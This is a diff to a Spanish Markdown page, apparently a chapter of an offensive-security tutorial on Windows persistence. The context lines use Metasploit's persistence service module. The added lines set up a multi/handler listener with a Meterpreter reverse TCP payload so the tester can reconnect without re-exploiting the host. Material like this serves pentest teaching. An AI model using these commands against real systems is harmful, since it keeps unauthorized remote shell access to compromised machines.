@@ -24,5 +24,16 @@ msf exploit(windows/persistence/service) > set service_name <nombre>
 msf exploit(windows/persistence/service) > exploit
 ```
 
+Una vez creado el servicio, podemos establecer una sesión en cualquier momento sin necesidad de volver a explotar el sistema. es necesario configurar las mismas opciones que en el payload y no lo es especificar el objetivo.
+
+```bash
+msf > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost <ip>
+msf exploit(multi/handler) > set lport <puerto>
+msf exploit(multi/handler) > exploit
+```
+
 [⟵ Anterior](07_linux_privesc.md) | [Siguiente ⟶](09_linux_pers.md)
 
